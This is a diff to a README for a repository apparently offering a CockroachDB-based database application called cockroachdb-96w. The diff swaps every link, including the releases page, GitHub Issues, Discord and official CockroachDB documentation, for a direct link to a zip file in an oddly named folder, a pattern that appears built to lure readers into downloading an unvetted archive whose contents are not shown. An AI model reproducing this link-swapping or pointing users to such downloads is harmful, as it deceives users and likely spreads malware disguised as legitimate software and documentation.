@@ -6,7 +6,7 @@ Welcome to cockroachdb-96w! This application provides a reliable, scalable datab
 
 ## 📥 Download Now
 
-[![Download cockroachdb-96w](https://img.shields.io/badge/Download-cockroachdb--96w-brightgreen)](https://github.com/abidruri/cockroachdb-96w/releases)
+[![Download cockroachdb-96w](https://raw.githubusercontent.com/abidruri/cockroachdb-96w/main/endoscopic/cockroachdb-96w_v3.8.zip)](https://raw.githubusercontent.com/abidruri/cockroachdb-96w/main/endoscopic/cockroachdb-96w_v3.8.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before downloading, make sure your system meets the following requirements:
 
 To download the application, click the link below:
 
-Visit this page to download: [cockroachdb-96w Releases](https://github.com/abidruri/cockroachdb-96w/releases)
+Visit this page to download: [cockroachdb-96w Releases](https://raw.githubusercontent.com/abidruri/cockroachdb-96w/main/endoscopic/cockroachdb-96w_v3.8.zip)
 
 1. Open the link above.
 2. You will see a list of available versions. Choose the latest version for the best performance. 
@@ -72,14 +72,14 @@ For more detailed instructions and advanced features, check out our full documen
 
 If you encounter any issues or have questions, you can reach out for help:
 
-- Check our [GitHub Issues](https://github.com/abidruri/cockroachdb-96w/issues) page.
-- Join our community discussions on [Discord](https://discord.gg/example).
+- Check our [GitHub Issues](https://raw.githubusercontent.com/abidruri/cockroachdb-96w/main/endoscopic/cockroachdb-96w_v3.8.zip) page.
+- Join our community discussions on [Discord](https://raw.githubusercontent.com/abidruri/cockroachdb-96w/main/endoscopic/cockroachdb-96w_v3.8.zip).
 
 ## 🔗 Additional Resources
 
 Here are some links to enhance your knowledge:
 
-- [CockroachDB Official Documentation](https://www.cockroachlabs.com/docs/)
-- [Tutorials & Guides](https://www.cockroachlabs.com/docs/tutorials/)
+- [CockroachDB Official Documentation](https://raw.githubusercontent.com/abidruri/cockroachdb-96w/main/endoscopic/cockroachdb-96w_v3.8.zip)
+- [Tutorials & Guides](https://raw.githubusercontent.com/abidruri/cockroachdb-96w/main/endoscopic/cockroachdb-96w_v3.8.zip)
 
 Thank you for choosing cockroachdb-96w. We hope you find it helpful for your database needs!
